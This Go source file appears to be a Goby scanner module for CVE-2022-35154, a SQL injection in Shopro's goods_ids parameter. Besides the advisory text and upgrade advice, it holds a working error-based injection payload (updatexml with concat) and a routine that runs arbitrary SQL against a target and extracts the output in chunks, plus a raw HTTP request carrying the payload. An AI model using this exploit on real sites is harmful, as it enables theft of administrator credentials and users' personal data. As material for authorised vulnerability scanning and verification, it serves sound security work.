package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Shopro lists path goods_ids parameter SQL injection vulnerability (CVE-2022-35154)",
    "Description": "<p>Shopro is a mall management system of XPTECH. The mall has powerful functions such as store decoration, user-defined templates, route synchronization, multi end payment (WeChat, Alipay), multi specification goods, freight templates, multi regional postage, inventory management, and full end sharing.</p><p>In addition to utilizing SQL injection vulnerabilities to obtain information in the database (such as administrator backend passwords, user personal information of the site), attackers can even write Trojan horses to the server under high privileges, further gaining server system privileges.</p>",
    "Product": "shopro",
    "Homepage": "https://www.shopro.top/",
    "DisclosureDate": "2022-08-18",
    "Author": "2075068490@qq.com",
    "FofaQuery": "body=\"/static/common/js/touch-emulator.js\" || title=\"Shopro\" || body=\"addons/shopro/Shopro.php\"",
    "GobyQuery": "body=\"/static/common/js/touch-emulator.js\" || title=\"Shopro\" || body=\"addons/shopro/Shopro.php\"",
    "Level": "3",
    "Impact": "<p>In addition to utilizing SQL injection vulnerabilities to obtain information in the database (such as administrator backend passwords, user personal information of the site), attackers can even write Trojan horses to the server under high privileges, further gaining server system privileges.</p>",
    "Recommendation": "<p>1. The manufacturer has released a solution, please upgrade to v1.3.9 or above: <a href=\"https://www.shopro.top/\">https://www.shopro.top/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/secf0ra11/secf0ra11.github.io/blob/main/Shopro_SQL_injection.md",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35154"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select database()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2022-35154"
    ],
    "CNNVD": [
        "CNNVD-202208-3366"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "Shopro lists 路径 goods_ids 参数 SQL 注入漏洞 （CVE-2022-35154）",
            "Product": "shopro",
            "Description": "<p>Shopro 是中国星品科技（XPTECH）公司的一个商城管理系统，该商城拥有强大的店铺装修、自定义模板、路由同步、多端支付（微信，支付宝）、多规格商品、运费模板、多地区邮费、库存管理、全端分享等功能。<br></p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、厂商已发布解决方案，请升级到 v1.3.9 或以上版本：<a href=\"https://www.shopro.top/\" target=\"_blank\">https://www.shopro.top/</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。&nbsp;<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Shopro lists path goods_ids parameter SQL injection vulnerability (CVE-2022-35154)",
            "Product": "shopro",
            "Description": "<p>Shopro is a mall management system of XPTECH. The mall has powerful functions such as store decoration, user-defined templates, route synchronization, multi end payment (WeChat, Alipay), multi specification goods, freight templates, multi regional postage, inventory management, and full end sharing.<br></p><p>In addition to utilizing SQL injection vulnerabilities to obtain information in the database (such as administrator backend passwords, user personal information of the site), attackers can even write Trojan horses to the server under high privileges, further gaining server system privileges.</p>",
            "Recommendation": "<p>1. The manufacturer has released a solution, please upgrade to v1.3.9 or above: <a href=\"https://www.shopro.top/\">https://www.shopro.top/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to utilizing SQL injection vulnerabilities to obtain information in the database (such as administrator backend passwords, user personal information of the site), attackers can even write Trojan horses to the server under high privileges, further gaining server system privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-11-20",
    "PocId": "10878"
}`
	sendPayload321m312 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		RequestConfig := httpclient.NewGetRequestConfig(fmt.Sprintf("/addons/shopro/goods/lists?page=1&goods_ids=%s", url.PathEscape("32),updatexml(1,concat(0x7e,("+sql+"),0x7e),1)-- -")))
		RequestConfig.VerifyTls = false
		RequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, RequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayload321m312(hostinfo, "select 0x35363534393164373034303133323435")
			return resp != nil && strings.Contains(resp.Utf8Html, "565491d704013245")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "sql" {
				sqlCommand := goutils.B2S(ss.Params["sql"])
				position := 0
				resp, err := sendPayload321m312(expResult.HostInfo, fmt.Sprintf("length((%s))", sqlCommand))
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(resp.Utf8Html, "XPATH syntax error: '~") {
					result := regexp.MustCompile(`XPATH syntax error: '~(.*?)'`).FindStringSubmatch(resp.Utf8Html)
					if len(result) > 1 {
						num, _ := strconv.ParseFloat(strings.TrimRight(result[1], "~"), 1)
						several := math.Round(num/28 + 0.5)
						for i := 0; i < int(math.Round(several)); i += 1 {
							resp, err := sendPayload321m312(expResult.HostInfo, fmt.Sprintf("substr((%s),%s,%s)", sqlCommand, strconv.Itoa(position+1), "28"))
							if err != nil {
								expResult.Success = false
								expResult.Output = err.Error()
								break
							} else if strings.Contains(resp.Utf8Html, "XPATH syntax error: '~") {
								result := regexp.MustCompile(`XPATH syntax error: '~(.*?)'`).FindStringSubmatch(resp.Utf8Html)
								if len(result) > 1 {
									expResult.Output += strings.TrimRight(result[1], "~")
									expResult.Success = true
								} else {
									expResult.Output = "漏洞利用失败！"
									expResult.Success = false
									break
								}
							}
							position += 28
						}
					}
				} else {
					expResult.Output = "漏洞利用失败！"
					expResult.Success = false
				}
			} else if attackType == "sqlPoint" {
				resp, err := sendPayload321m312(expResult.HostInfo, "select 0x35363534393164373034303133323435")
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(resp.Utf8Html, "565491d704013245") {
					expResult.Output = `GET /addons/shopro/goods/lists?page=1&goods_ids=32%29%2Cupdatexml%281%2Cconcat%280x7e%2C%28select%200x35363534393164373034303133323435%29%2C0x7e%29%2C1%29--%20- HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close`
					expResult.Success = true
				} else {
					expResult.Output = "漏洞利用失败！"
					expResult.Success = false
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
